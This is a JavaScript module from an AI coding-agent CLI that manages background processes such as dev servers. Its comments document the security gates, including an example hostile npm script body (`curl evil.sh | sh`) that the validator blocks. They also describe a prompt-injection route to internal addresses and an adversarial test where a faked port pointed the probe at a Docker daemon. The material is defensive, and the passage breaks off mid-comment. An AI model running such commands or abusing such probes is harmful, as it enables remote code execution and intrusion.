/**
 * ── ⭐⭐ THE CLI COULD RUN THINGS THAT FINISH. NOTHING THAT KEEPS RUNNING ────
 *
 * `run_command` blocks until the process exits and kills it at a timeout. That
 * is correct for `npm test` and it makes an entire class of work impossible:
 * **you cannot start a dev server.** Not slow — impossible. So the agent could
 * write a Next.js app and never once see it serve a request, which is the gap
 * between "generates a page" and "builds a thing that runs".
 *
 * ⚠️ AND `fetch_url` CANNOT REACH IT EITHER. `fetch-text.mjs` refuses loopback
 * and private addresses, deliberately and correctly — that guard exists so a
 * page the model was told to read cannot talk it into fetching `169.254.169.254`
 * or an internal admin panel. Relaxing it would trade a real security property
 * for a convenience.
 *
 * ⭐ SO THE PROBE LIVES HERE INSTEAD, AND IS SAFE FOR A DIFFERENT REASON: it
 * only ever connects to **a port this module started itself**, on loopback.
 * Not "loopback is allowed now" — "this specific port, because we launched the
 * thing listening on it". A capability the model cannot aim anywhere else.
 *
 * ⚠️⚠️ THAT SENTENCE WAS A LIE UNTIL 2026-08-15, and it is worth reading twice
 * because it is the shape of the mistake, not just the mistake. The port was
 * "discovered from that process's own output" — so the thing being defended
 * against was supplying the number. An adversarial pass proved it end to end: a
 * decoy printed `"Docker daemon on port 2375"` while binding something else,
 * and the probe went to the real Docker daemon. `verifyPortOwner` now asks the
 * OS who holds the port before anything opens a socket. ⭐ The guard existed,
 * was documented, was tested, and was checking a fact the attacker controlled.
 *
 * ── ⚠️⚠️ ORPHANS ARE THE FAILURE MODE, AND THIS REPO HAS ALREADY PAID ───────
 *
 * `command.mjs` records it: `npm test` left pid 13128 running with its parent
 * already gone — a true orphan, until reboot, on the owner's personal laptop.
 * A BACKGROUND process is that same shape by definition, so:
 *
 * 1. every process is registered the moment it spawns, before anything can throw;
 * 2. `process.once('exit')` plus SIGINT/SIGTERM/SIGBREAK kill the whole registry
 *    — the pattern `lsp.mjs:507` already uses, because 'exit' does NOT fire on a
 *    signal and a Ctrl-C that leaves three dev servers running is the bug;
 * 3. the killer is `killProcessTree` IMPORTED from `command.mjs`, never a second
 *    copy — the Windows `taskkill /T` and POSIX negative-pid branches are both
 *    non-obvious and both were learned from a real orphan.
 *
 * ── ⚠️ AND IT IS THE SAME ALLOWLIST ────────────────────────────────────────
 *
 * This does not get its own permission model. `--no-run` withholds it, a dry run
 * refuses it, and the command goes through `validateCommand` exactly as
 * `run_command` does. A second door with weaker locks is how `--no-run` becomes
 * a lie by a side door — the rule `tools.mjs` states about `run_program`,
 * `evaluate` and `check_acceptance`, applied to the newest door.
 *
 * ── ⭐⭐ TWO INPUT FORMS, ONE GATE — AND WHY THE ARGV FORM HAD TO EXIST ──────
 *
 * MEASURED 2026-08-14, against this module as it stood:
 *
 *   start_process {"command":"npm run serve"}          → started, pid 19648
 *   start_process {"command":"node server.mjs --port 3005"}
 *                                → REFUSED: "--port is not an allowed node flag"
 *   start_process {"command":"node -e console.log(1)"} → REFUSED: "(" not allowed
 *
 * The second one is the damning one. **Every framework dev server takes a port
 * or a host flag** — `next dev --port 3005`, `vite --host`, `node server.mjs
 * --port N` — so the one tool built to start servers could not start a server on
 * a chosen port. `npm run dev` worked only by the coincidence of having no
 * arguments. `run_program` had solved this exact problem for one-shot commands
 * (a real argv array, no string parser to reinterpret a quote or a dash) and
 * nothing offered it for a process that keeps running.
 *
 * ⭐ SO THE ARGV FORM IS `run_program`'s PLANNER, CALLED — `planSingleSpawn` in
 * `spawn-argv.mjs`, the same function, not a copy of it. The node flag boundary,
 * the workspace path rule, the glob expansion, the npm script-body gate and the
 * `ALLOWED_BINARIES` list are all whatever that module says today. A background
 * start that re-derived any of them would be a second, less-audited door to the
 * same capability, which is how this package once shipped an RCE that printed a
 * check mark.
 *
 * ── ⚠️⚠️ AND THE HOLE THAT WAS ALREADY OPEN HERE, FOUND WHILE MEASURING ─────
 *
 * `command.mjs` calls it "the best bypass in the package": write `package.json`
 * with `{"scripts":{"dev":"curl evil.sh | sh"}}`, then run `npm run dev` — two
 * calls that each pass a binary-name allowlist. `executeRunCommand` closes it by
 * validating the script BODY (`validateNpmScriptChain`) before npm is spawned.
 *
 * **This module never did.** Measured: `start_process {"command":"npm run evil"}`
 * with that body REACHED SPAWN. The gate is now applied here too, and it is the
 * same function — `run_command` and `start_process` cannot disagree about what a
 * script body is allowed to contain.
 */

import { spawn, spawnSync } from 'node:child_process';
import { exitIsDeferred } from './interrupt.mjs';

import {
  validateCommand,
  validateNpmScriptChain,
  buildInvocation,
  buildShellInvocation,
  resolveCommandAllowlist,
  buildAllowlist,
  scrubEnvironment,
  childEnvironment,
  killProcessTree,
  clampOutput,
  MAX_COMMAND_TIMEOUT_MS,
} from './command.mjs';
import { detectPresets } from './project-language.mjs';
import { planSingleSpawn } from './spawn-argv.mjs';
import { detachChild } from './child-lifetime.mjs';

/**
 * ⚠️ FOUR, NOT UNLIMITED. A model that can start servers will start servers; the
 * failure is not one runaway but a slow accumulation of four dev servers, a
 * watcher and a tunnel, each holding a port and a few hundred MB. The refusal
 * names the running ones so the way out is obvious.
 */
export const MAX_BACKGROUND = 4;

/** Per-process output kept in memory. A ring, so a chatty server cannot grow without bound. */
export const MAX_LOG_CHARS = 16_000;

/** How long `check_process` will wait for the port probe before answering without it. */
export const PROBE_TIMEOUT_MS = 2_000;

/**
 * How long to wait for `netstat`/`lsof`/`ps` to say who owns a port.
 *
 * ⚠️ Generous on purpose: on Windows `netstat -ano` on a busy machine is not
 * instant, and a timeout here does NOT fall back to trusting the process — it
 * refuses to probe. So a mean timeout costs a working feature, not a hole.
 */
export const PORT_OWNER_TIMEOUT_MS = 5_000;

/**
 * ⭐ HOW A PORT IS DISCOVERED: from what the process SAYS, not from a guess.
 * Every dev server prints its URL — that line is the contract, and reading it
 * beats assuming 3000 (which is wrong the moment two servers run, and Next.js
 * itself silently moves to 3001).
 *
 * ⚠️ ORDER MATTERS: a full URL is matched before a bare `:port`, or
 * `http://localhost:3000` would yield the port from the wrong pattern half the
 * time depending on which ran first.
 */
export const PORT_PATTERNS = Object.freeze([
  /https?:\/\/(?:localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]):(\d{2,5})/i,
  /\blistening\b[^\n]*?\bport\b\D{0,10}(\d{2,5})/i,
  /\bport\b\D{0,10}(\d{2,5})/i,
  /(?:^|\s):(\d{4,5})\b/,
]);

/**
 * The live registry. Module-level on purpose: the exit hooks below must be able
 * to reach every process regardless of which session started it, and a session
 * that throws must not be able to take the registry down with it.
 * @type {Map<string, object>}
 */
const live = new Map();
let counter = 0;

/** Kill everything, best effort, never throwing. The one function the hooks call. */
export function stopAllBackground() {
  for (const rec of [...live.values()]) {
    try { killProcessTree(rec.child); } catch { /* already gone */ }
    rec.running = false;
  }
  live.clear();
}

/**
 * ⚠️ REGISTERED ONCE, AT MODULE LOAD, AND NOT INSIDE A SESSION. `turn.mjs`
 * documents why: registering inside the run means a second run adds a second
 * listener, and 'exit' does not fire on a signal at all. Both hooks are needed —
 * neither covers the other.
 */
let hooked = false;
function installExitHooks() {
  if (hooked) return;
  hooked = true;
  process.once('exit', stopAllBackground);
  for (const [sig, code] of [['SIGINT', 130], ['SIGTERM', 143], ['SIGBREAK', 149]]) {
    try {
      process.once(sig, () => {
        stopAllBackground();
        // ⚠️ Cleanup ALWAYS runs; only the exit is deferrable. A first Ctrl-C
        // asks the run to stop at its round boundary — see lib/interrupt.mjs —
        // but the children this module owns are reaped either way, because a
        // deferred exit is not a reason to leave a process tree behind.
        if (!exitIsDeferred()) process.exit(code);
      });
    } catch { /* SIGBREAK does not exist off Windows */ }
  }
}

/** Append to a process's ring buffer. */
function record(rec, chunk) {
  rec.log += chunk;
  if (rec.log.length > MAX_LOG_CHARS) {
    rec.truncated = true;
    rec.log = rec.log.slice(-MAX_LOG_CHARS);
  }
  if (rec.port === null) rec.port = detectPort(rec.log);
}

/**
 * ── ⚠️⚠️ THE PORT A PROCESS **CLAIMED**. NOT A PORT WE KNOW IT HOLDS ────────
 *
 * The comment here used to read: *"Exported because 'we only probe a port we
 * started' is a security claim, and it is only true if this is testable."*
 * The claim was **false**, and no amount of testing this function could have
 * shown it — the function is correct; its INPUT is the problem.
 *
 * This reads the child's own STDOUT. A repository somebody cloned decides what
 * its `npm run dev` prints, so a repository decides this number. Proven end to
 * end by an adversarial pass: a decoy server bound one port while printing
 * `"Docker daemon on port 2375"`, `listBackground()` duly reported
 * `{"port":2375}`, and a probe was aimed at the real Docker daemon — whose API
 * on 2375 is unauthenticated and will mount the host filesystem into a
 * container. The module header's boast, *"this specific port, because we
 * launched the thing listening on it"*, was the one sentence that was untrue.
 *
 * ⭐ SO THIS RETURNS A CLAIM, AND IT IS NAMED AS ONE. `verifyPortOwner` turns
 * the claim into a fact by asking the OPERATING SYSTEM who is listening. No
 * caller that touches the network may use the claim without that check.
 *
 * @param {string} text
 * @returns {number|null}
 */
export function detectPort(text) {
  if (typeof text !== 'string' || text === '') return null;
  for (const pattern of PORT_PATTERNS) {
    const m = pattern.exec(text);
    if (!m) continue;
    const port = Number(m[1]);
    // ⚠️ A "port" of 0, 80 or 65536 out of a log line is almost certainly a
    // version number or a byte count. Dev servers live above 1024.
    if (Number.isInteger(port) && port > 1024 && port <= 65535) return port;
  }
  return null;
}

/**
 * ── ⭐⭐ WHO ACTUALLY HOLDS THIS PORT — ASKED OF THE OS, NOT OF THE CHILD ────
 *
 * `detectPort` reads a number the child chose. This asks the kernel which
 * process is listening on it, and answers whether that process is the one this
 * run started.
 *
 * ⚠️ IT DEGRADES TO `verified:false`, NEVER TO `owned:true`. If netstat/lsof is
 * absent, times out, or prints a shape we do not recognise, the answer is "I
 * could not check" — and a caller must treat that as a refusal, exactly as
 * `gateNpmScript` above treats an unreadable `package.json`. "I could not check
 * it" and "it is fine" are different answers and only one of them is honest.
 *
 * ⚠️ AND IT IS NOT ON THE HOT PATH. It spawns a process, so it runs when a port
 * is about to be USED, not on every chunk of output. `record()` still stores the
 * claim; `checkBackground` is where the claim has to become a fact.
 *
 * @param {number} port
 * @param {number|null} pid the process this run started
 * @param {{spawnImpl?: Function, platform?: string, timeoutMs?: number}} [opts]
 * @returns {{owned: boolean, verified: boolean, owner: number|null, why: string}}
 */
export function verifyPortOwner(port, pid, { spawnImpl = spawnSync, platform = process.platform, timeoutMs = PORT_OWNER_TIMEOUT_MS } = {}) {
  const n = Number(port);
  if (!Number.isInteger(n) || n <= 0 || n > 65535) {
    return { owned: false, verified: true, owner: null, why: `${port} is not a port number` };
  }
  const root = Number(pid);
  if (!Number.isInteger(root) || root <= 0) {
    return { owned: false, verified: false, owner: null, why: 'the process this run started has no pid, so nothing can be matched against it' };
  }

  const tool = platform === 'win32' ? 'netstat' : 'lsof';
  let out = null;
  try {
    const r = platform === 'win32'
      ? spawnImpl('netstat', ['-ano', '-p', 'TCP'], { encoding: 'utf8', windowsHide: true, timeout: timeoutMs })
      : spawnImpl('lsof', [`-iTCP:${n}`, '-sTCP:LISTEN', '-nP', '-Fp'], { encoding: 'utf8', timeout: timeoutMs });
    if (r && r.status === 0 && typeof r.stdout === 'string') out = r.stdout;
  } catch {
    out = null;
  }
  if (out === null) {
    return {
      owned: false,
      verified: false,
      owner: null,
      why: `could not ask this machine who is listening on ${n} (${tool} did not answer), and the port was read from a process's own output`,
    };
  }

  const owners = platform === 'win32' ? winListeners(out, n) : posixListeners(out);
  if (owners.length === 0) {
    return { owned: false, verified: true, owner: null, why: `nothing is listening on ${n} yet` };
  }

  /**
   * ⭐ THE PROCESS WE STARTED, **OR ONE OF ITS DESCENDANTS**. A dev server forks:
   * `npm run dev` spawns node, which spawns the real server, so the listener is
   * usually a grandchild. An exact-pid rule would refuse nearly every real
   * Next.js and Vite server — and a guard that fails correct work gets switched
   * off, which this package calls the worse failure.
   */
  const family = descendantsOf(root, { spawnImpl, platform, timeoutMs });
  const hit = owners.find((o) => o === root || family.has(o));
  if (hit !== undefined) {
    return { owned: true, verified: true, owner: hit, why: `pid ${hit} is listening on ${n} and belongs to the process this run started` };
  }
  return {
    owned: false,
    verified: true,
    owner: owners[0],
    why: `port ${n} belongs to pid ${owners[0]}, which this run did NOT start — the number came from a process's own output, and a repository decides what its dev server prints`,
  };
}

/** LISTENING rows of `netstat -ano`, for one port, as owning pids. */
function winListeners(text, port) {
  const pids = [];
  for (const line of String(text).split(/\r?\n/)) {
    if (!/\bLISTENING\b/i.test(line)) continue;
    // `TCP    0.0.0.0:3002    0.0.0.0:0    LISTENING    11192` — and the IPv6
    // form `[::]:3002`, whose colons are why the address is matched as a lump
    // and the port taken from the LAST colon rather than by splitting.
    const m = /^\s*TCP\s+(\S+):(\d+)\s+\S+\s+LISTENING\s+(\d+)/i.exec(line);
    if (!m) continue;
    if (Number(m[2]) !== port) continue;
    const pid = Number(m[3]);
    if (Number.isInteger(pid) && !pids.includes(pid)) pids.push(pid);
  }
  return pids;
}

/** `lsof -Fp` prints one `p<pid>` line per owner; the port was in the query. */
function posixListeners(text) {
  const pids = [];
  for (const line of String(text).split(/\r?\n/)) {
    const m = /^p(\d+)$/.exec(line.trim());
    if (!m) continue;
    const pid = Number(m[1]);
    if (Number.isInteger(pid) && !pids.includes(pid)) pids.push(pid);
  }
  return pids;
}

/**
 * Every descendant pid of `pid`, best effort.
 *
 * ⚠️ BEST EFFORT MEANS SMALLER, NEVER LARGER. If the process table cannot be
 * read the set comes back EMPTY, so `verifyPortOwner` refuses rather than
 * accepts. A guess that widened the family would be a guess that widened the
 * hole, and the whole point of this file today is that the permissive default
 * was the bug.
 */
export function descendantsOf(pid, { spawnImpl = spawnSync, platform = process.platform, timeoutMs = PORT_OWNER_TIMEOUT_MS } = {}) {
  const family = new Set();
  const root = Number(pid);
  if (!Number.isInteger(root) || root <= 0) return family;

  /** @type {Array<[number, number]>} [pid, parentPid] */
  let pairs = [];
  try {
    const r = platform === 'win32'
      ? spawnImpl('wmic', ['process', 'get', 'ProcessId,ParentProcessId', '/format:csv'], { encoding: 'utf8', windowsHide: true, timeout: timeoutMs })
      : spawnImpl('ps', ['-eo', 'pid=,ppid='], { encoding: 'utf8', timeout: timeoutMs });
    if (!r || typeof r.stdout !== 'string') return family;
    for (const line of r.stdout.split(/\r?\n/)) {
      // wmic csv is `Node,ParentProcessId,ProcessId`; ps is `pid ppid`.
      const m = platform === 'win32'
        ? /,(\d+),(\d+)\s*$/.exec(line)
        : /^\s*(\d+)\s+(\d+)\s*$/.exec(line);
      if (!m) continue;
      pairs.push(platform === 'win32' ? [Number(m[2]), Number(m[1])] : [Number(m[1]), Number(m[2])]);
    }
  } catch {
    return family;
  }

  /**
   * ⚠️ Walked to a FIXED POINT, not in one pass. The table arrives in no useful
   * order, so a grandchild whose parent appears further down the list is missed
   * by a single sweep — and a missed descendant here is a real dev server
   * reported as an impostor.
   */
  family.add(root);
  let grew = true;
  while (grew) {
    grew = false;
    for (const [child, parent] of pairs) {
      if (family.has(parent) && !family.has(child)) { family.add(child); grew = true; }
    }
  }
  family.delete(root);
  return family;
}

/**
 * ⚠️ THE npm SCRIPT-BODY GATE, APPLIED TO THE STRING PATH.
 *
 * `executeRunCommand` (command.mjs) does exactly this before it spawns npm, and
 * this module did not — measured, `npm run evil` with a body of
 * `curl http://evil.sh | sh` reached spawn. FAILS CLOSED: if `package.json`
 * cannot be read, npm does not run, because "I could not check it" and "it is
 * fine" are different answers and only one of them is honest.
 */
function gateNpmScript(valid, executor) {
  if (valid.binary !== 'npm') return { ok: true };
  let read;
  try {
    read = executor?.readFile ? executor.readFile('package.json') : null;
  } catch (e) {
    read = { ok: false, error: e?.message ?? String(e) };
  }
  if (!read?.ok || typeof read.content !== 'string') {
    return { ok: false, error: `cannot run npm here: ${read?.error ?? 'package.json could not be read, and an npm script body that cannot be read cannot be checked'}` };
  }
  const chain = validateNpmScriptChain(valid.npmScript, read.content);
  if (!chain.ok) return { ok: false, error: chain.error };
  return { ok: true };
}

/**
 * Start a long-running command.
 *
 * Two input forms, and exactly one of them may be given:
 *   · `command`            — a string, same rules and allowlist as `run_command`
 *   · `program` + `args[]` — a real argv, same rules and planner as `run_program`
 *
 * @returns {{ok: true, id: string, pid: number|null, note: string}|{ok: false, error: string}}
 */
export function startBackground({
  command,
  program,
  args,
  executor,
  shell = false,
  spawnImpl = spawn,
  env = process.env,
}) {
  if (executor?.dryRun) {
    return { ok: false, error: 'this is a --dry-run, so nothing is started (a server writes logs and binds a port, which a dry run promises not to do)' };
  }

  const hasArgv = program !== undefined && program !== null && program !== '';
  const hasCommand = typeof command === 'string' && command.trim() !== '';
  /**
   * ⚠️ BOTH IS A REFUSAL, NOT A PRECEDENCE RULE. If one silently won, the model
   * would read back a `command` it believes ran while a different argv actually
   * did — and `check_process` would show the winner, so the mistake would look
   * like the tool lying rather than like a malformed call.
   */
  if (hasArgv && hasCommand) {
    return { ok: false, error: 'give either "command" (a string) or "program" + "args" (a real argv), not both. The argv form is the one to use when an argument contains a space, a quote, or a leading dash.' };
  }
  if (!hasArgv && !hasCommand) {
    return { ok: false, error: 'start_process needs something to start: "command" (e.g. "npm run dev"), or "program" + "args" (e.g. program "node", args ["server.mjs","--port","3005"]).' };
  }

  if (live.size >= MAX_BACKGROUND) {
    const names = [...live.values()].map((r) => `${r.id} (${r.command})`).join(', ');
    return {
      ok: false,
      error: `${MAX_BACKGROUND} background processes are already running: ${names}. `
        + 'Stop one with stop_process before starting another — each holds a port and memory until this run ends.',
    };
  }

  /**
   * ⚠️ THE SAME PATHS `executeRunCommand` AND `runProgram` USE, AND NONE OF THEM
   * SHARE A VALIDATOR. `command.mjs` states the reason: a validator that
   * sometimes validates is the shape that produces a "safe" mode which quietly
   * is not.
   */
  let invocation;
  /** What the audit line, the cap refusal and `check_process` will show. */
  let label = typeof command === 'string' ? command : '';
  /** The logical argv, present only for the argv form — the receipt that proves
   *  `"buy milk"` survived as ONE slot, which is the fact a string can never show. */
  let argv = null;

  if (hasArgv) {
    /**
     * ── ✅ FIXED 2026-08-29. THE TWO FORMS NOW GIVE ONE ANSWER. ───────────────
     *
     * ⚠️ THIS COMMENT USED TO SAY THE OPPOSITE AND IT WAS TRUE WHEN WRITTEN:
     * `planSingleSpawn` gated on the frozen four while the string branch below
     * resolved `.acuvo/commands.json` / ACUVO_ALLOW_COMMANDS / the project's
     * language manifests, so `start_process {command:'make test'}` STARTED and
     * `start_process {program:'make', args:['test']}` was refused — same tool,
     * same operator configuration, two answers, and the refusal claimed make was
     * "not reachable from here at all" while it was running next door.
     *
     * ⭐ AND THE PREVIOUS ATTEMPT'S WARNING WAS THE USEFUL PART: a 2026-08-24 try
     * punched past the binary gate and left the argv walk falling through to
     * **tsc's** flag grammar, so `make` passed and `make -j4` did not — *"test
     * with ARGUMENTS, because a zero-arg check cannot fail here."* The advice it
     * gave is the shape of the fix that shipped: `planSingleSpawn` is TAUGHT the
     * resolved allowlist rather than having the gate removed, each preset binary
     * is validated by its OWN grammar via `validatePresetArgv`, and
     * `test/allowlist-gate.test.mjs` pins `make -j4` and `python -m pip install`
     * specifically so a zero-arg check can never be what proves this again.
     *
     * ⚠️ THE ARGV FORM STILL GETS NO SHELL, EVEN UNDER `--shell`. There is no
     * string for a shell to reinterpret, so routing it through one would only
     * ADD a parser — strictly more surface for strictly no gain.
     */
    const plan = planSingleSpawn({ root: executor?.root, program, args });
    if (!plan.ok) return { ok: false, error: plan.error };
    invocation = { ok: true, file: plan.file, args: plan.spawnArgs };
    argv = plan.argv;
    label = JSON.stringify(plan.argv);
  } else if (shell) {
    invocation = buildShellInvocation(command);
    if (!invocation.ok) return { ok: false, error: invocation.error };
  } else {
    let allowlist;
    try {
      const configText = executor?.readFile ? (executor.readFile('.acuvo/commands.json')?.content ?? null) : null;
      const resolved = resolveCommandAllowlist({ configText, envValue: env.ACUVO_ALLOW_COMMANDS });
      allowlist = resolved.allowlist;

      /**
       * ── ⭐⭐⭐ A PROJECT THAT DECLARES ITS LANGUAGE GETS THAT LANGUAGE ──────
       *
       * Measured on our own bench 2026-08-23: 12/13 tasks passed and the one
       * failure was `polyglot`, a Python repo whose task only closes if the
       * agent can run pytest. It could not — `resolveCommandAllowlist({})`
       * returns ZERO presets, so python, go, rust, ruby and make are all off
       * unless somebody writes a config file first.
       *
       * ⚠️ THAT IS NOT A PYTHON PROBLEM. "Run the failing test, then fix the
       * code" is the loop that makes a coding agent worth paying for, and it
       * silently did not work in most of the languages people write. Nobody
       * would report it either: they would try it on their Django project,
       * watch it decline, and conclude the tool is weak.
       *
       * ⚠️ IT DOES NOT LOOSEN WHAT A PRESET PERMITS. Each preset is a grammar
       * — the python one validates argv through `validatePythonArgv`, so
       * `python -c "..."` stays refused either way. Detection chooses WHICH
       * grammar is available, from evidence the project itself carries.
       *
       * ⚠️ AND AN EXPLICIT CONFIG STILL WINS. `resolved.stated` means the user
       * wrote one; a person who listed exactly what this agent may run has
       * made a decision, and quietly adding to it would be the tool overruling
       * them on their own machine.
       */
      const userConfigured = (resolved.sources?.length ?? 0) > 0;
      if (!userConfigured && executor?.listDir) {
        const root = executor.listDir('.');
        const names = root?.ok && Array.isArray(root.entries)
          ? root.entries.filter((e) => e.type === 'file').map((e) => e.name)
          : [];
        const detected = detectPresets(names);
        if (detected.length > 0) allowlist = buildAllowlist({ presets: detected });
      }
    } catch {
      allowlist = undefined;
    }
    const valid = validateCommand(command, allowlist ? { allowlist } : {});
    if (!valid.ok) return { ok: false, error: valid.error };
    const gated = gateNpmScript(valid, executor);
    if (!gated.ok) return gated;
    invocation = buildInvocation(valid, executor.root);
    if (invocation.ok === false) return { ok: false, error: invocation.error };
  }

  counter += 1;
  const id = `bg${counter}`;
  const rec = {
    id,
    command: label,
    argv,
    log: '',
    truncated: false,
    port: null,
    /**
     * Has the OS confirmed this process (or a descendant) holds `port`?
     * `null` = not asked yet. Only `true` permits a probe — see
     * `checkBackground`, and `detectPort` for why the claim alone is worthless.
     */
    portOwned: null,
    portOwnerWhy: null,
    portOwnerVerified: null,
    running: true,
    exitCode: null,
    signal: null,
    startedAt: Date.now(),
    child: null,
  };

  installExitHooks();
  /**
   * ⚠️ REGISTERED BEFORE THE SPAWN CAN THROW. If `spawn` fails after a pid
   * exists but before we record it, that pid is an orphan nothing can reach.
   */
  live.set(id, rec);

  try {
    const child = spawnImpl(invocation.file, invocation.args, {
      cwd: executor.root,
      /**
       * ⚠️ `childEnvironment` — a background process is a child like any
       * other, and a long-running one that shells out to npm is the same
       * escalation the one-shot road had. Given the argv so an npm dev server
       * (`npm run dev`) keeps its pre/post hooks; see `childEnvironment`.
       */
      env: childEnvironment({ file: invocation.file, args: invocation.args }, env),
      windowsHide: true,
      // POSIX: its own process group, so a negative-pid kill reaches the tree.
      detached: process.platform !== 'win32',
      /**
       * ⭐ C1 (2026-09-07): stdin is a PIPE, kept open, so `write_process` can
       * talk to a REPL or answer a prompt. It was 'ignore', which hands the
       * child an immediate EOF — a `node -i` or `python -i` exits on the spot,
       * and a dev server that reads a keypress menu ("press r to restart")
       * never can. A silent open pipe is what a terminal with nobody typing is.
       * ⚠️ The pty transport (node-pty) was built, measured and WITHDRAWN —
       * README "ACUVO_PTY_MODULE" — so this is the zero-dependency half of it:
       * input and output, no terminal emulation.
       */
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    rec.child = child;
    /**
     * ── ⚠️⚠️ A BACKGROUND PROCESS MUST NOT DECIDE WHEN ACUVO EXITS ────────────
     *
     * C1 made stdin a kept-open PIPE so `write_process` can talk to a running
     * child. That is right, and it also turned this into a module that spawns a
     * long-lived child with piped stdio — which
     * `child-lifetime-rule.test.ts` requires to detach, because each such pipe
     * is a handle holding the event loop open. Without this a session that ever
     * started a dev server hangs at the end with no message.
     *
     * ⚠️ `detachChild` UNREFS THE PIPES AS WELL AS THE CHILD. Unreffing the
     * child alone is not enough — `lib/child-lifetime.mjs` has the full account,
     * and `lsp.mjs` learned it the same way.
     *
     * ⭐ It does NOT kill anything: the process keeps running and keeps being
     * recorded, which is the whole point of a background process. It only stops
     * that process from being a reason acuvo cannot exit.
     */
    detachChild(child);
    child.stdout?.setEncoding?.('utf8');
    child.stderr?.setEncoding?.('utf8');
    child.stdout?.on?.('data', (c) => record(rec, String(c)));
    child.stderr?.on?.('data', (c) => record(rec, String(c)));
    child.on?.('error', (e) => { record(rec, `\n[spawn error] ${e?.message ?? e}\n`); rec.running = false; });
    /**
     * ── ⚠️⚠️ `exit` RECORDS THE CODE; `close` DECIDES IT IS OVER ─────────────
     *
     * FOUND BY A FAILING TEST, and it would have been a miserable bug in the
     * field. `exit` fires when the process ends — but its stdout and stderr may
     * still hold buffered data, so a `check_process` racing in at that instant
     * reports `running:false, exitCode:1` with **empty output**: the crash is
     * announced and the reason for it is gone. That is the single most valuable
     * moment this tool has, and it was the one that could arrive blank.
     *
     * `close` fires only after every stdio stream is drained, so treating THAT
     * as "it is over" guarantees the exit code and the error message arrive
     * together. `exit` still records the code, because `close` does not always
     * carry it.
     */
    child.on?.('exit', (code, signal) => {
      rec.exitCode = code;
      rec.signal = signal;
    });
    child.on?.('close', (code, signal) => {
      rec.running = false;
      if (rec.exitCode === null) rec.exitCode = code;
      if (!rec.signal) rec.signal = signal;
    });

    return {
      ok: true,
      id,
      pid: child?.pid ?? null,
      /**
       * ── ⚠️⚠️⭐ THE FIRST THING SAID ABOUT A BACKGROUND JOB TAUGHT THE POLL ──
       *
       * This note used to read: *"Call check_process in a LATER ROUND to read
       * its output…"* — and the model did exactly that, 146 times across the
       * measured archive, at one whole model call each. See
       * `STILL_RUNNING_ADVICE` for the numbers.
       *
       * ⭐ SO THE VERY FIRST SENTENCE ABOUT THE JOB NOW NAMES THE BLOCKING VERB.
       * `check_process` is still named, for the thing it is uniquely good at —
       * ONE look, to learn the port — and never as the way to wait.
       */
      note: `started in the background as ${id}. It keeps running while you do other things. `
        + `⚠️ To WAIT for it, do not spend a round: call wait_for_output {"id":"${id}","contains":"<a line it will print>"} `
        + `for a server, or {"id":"${id}","untilExit":true} for a build or an install — both block inside the one tool `
        + `call. Use check_process {"id":"${id}"} for a single look at its output and the port it bound, not as a loop.`,
    };
  } catch (e) {
    live.delete(id);
    return { ok: false, error: `could not start it: ${e?.message ?? e}` };
  }
}

/**
 * Is the port this process announced actually accepting connections?
 *
 * ⚠️ THE ONLY NETWORK CALL IN THIS FILE, AND IT IS BOUNDED THREE WAYS: loopback
 * only, a port we started, and a timeout. It reports a REACHABILITY fact, never
 * a body — this is not a back door to fetching pages.
 */
async function probePort(port, { timeoutMs = PROBE_TIMEOUT_MS, fetchImpl = fetch } = {}) {
  if (!Number.isInteger(port)) return null;
  const ac = new AbortController();
  const timer = setTimeout(() => ac.abort(), timeoutMs);
  try {
    const res = await fetchImpl(`http://127.0.0.1:${port}/`, { signal: ac.signal, redirect: 'manual' });
    return { reachable: true, status: res.status };
  } catch (e) {
    return { reachable: false, why: e?.name === 'AbortError' ? 'no answer within the timeout' : (e?.message ?? String(e)) };
  } finally {
    clearTimeout(timer);
  }
}

/**
 * ── ⚠️⚠️⭐ THIS SENTENCE USED TO SAY "CHECK AGAIN IN A LATER ROUND" ──────────
 *
 * It said it in all three of the still-running branches below, and it was our
 * own tool RESULT instructing the model to spend a model call — prompt re-sent,
 * output billed, no reasoning done — on the question "is it finished yet?".
 *
 * MEASURED in this repo's own Terminal-Bench archive (`bench/terminal-bench/
 * results/`, 111 parseable runs, 1,236 rounds): **38 rounds were polls**, across
 * 8 runs, and `check_process` appears **146 times**. Four of the nine runs that
 * died on the round cap were polling runs — POV-Ray, pMARS and two R installs,
 * every one of them a build with no ready line to wait for. Verbatim from the
 * logs: `sleep 60; echo "waited"` · `sleep 120; echo "waited"` · *"Still
 * compiling."* · nine bare `check_process` calls inside one 32-round run.
 *
 * ⭐ IT IS NOT ADVICE ANY MORE, IT IS A REDIRECT, and it names a verb that now
 * does the job: `wait_for_output` with `untilExit` blocks inside ONE tool call
 * until the process stops. Telling someone to come back later is only reasonable
 * when coming back is free, and here it is the single most expensive thing the
 * loop can do.
 *
 * ⚠️ ZERO PER-ROUND BYTES. This is a tool RESULT, not a prompt line and not a
 * schema — it is paid for only on a round that had already happened, and only by
 * the run that actually started a background process.
 */
export const STILL_RUNNING_ADVICE =
  '⚠️ Do NOT spend another round asking — a check_process call is a whole model round for one bit of information. '
  + 'Call wait_for_output instead: {"id":"<id>","contains":"<a line it will print>"} for a server, or '
  + '{"id":"<id>","untilExit":true} for a build or an install, and it blocks until that happens and returns the exit code.';

/**
 * What a background process has done since it started.
 * @returns {Promise<object>}
 */
export async function checkBackground(id, { probe = probePort, verifyOwner = verifyPortOwner } = {}) {
  const rec = live.get(id);
  if (!rec) {
    const known = [...live.keys()];
    return {
      ok: false,
      error: known.length === 0
        ? 'no background process with that id — none are running. Start one with start_process.'
        : `no background process "${id}". Running now: ${known.join(', ')}.`,
    };
  }

  const clamped = clampOutput(rec.log);
  const out = {
    ok: true,
    id,
    command: rec.command,
    /** ⭐ Present only for the argv form, and it is the receipt: it shows each
     *  argument in its own slot, so a model can SEE that `--port 3005` arrived as
     *  two arguments to the script rather than as a node flag. */
    ...(rec.argv ? { argv: rec.argv } : {}),
    running: rec.running,
    uptimeMs: Date.now() - rec.startedAt,
    port: rec.port,
    /**
     * ⚠️ FLATTENED ON PURPOSE. `clampOutput` returns `{text, truncated,
     * omitted}`, and passing that object straight through gives the model a
     * nested shape to unwrap before it can read a stack trace — plus a second
     * `truncated` beside it meaning something subtly different (the ring buffer
     * dropped old lines vs this reply dropped the tail). One string, one flag.
     */
    output: clamped.text,
    truncated: rec.truncated || clamped.truncated === true,
  };

  /**
   * ⚠️⚠️ A PROCESS THAT DIED ON STARTUP MUST NOT READ AS "STARTING UP". This is
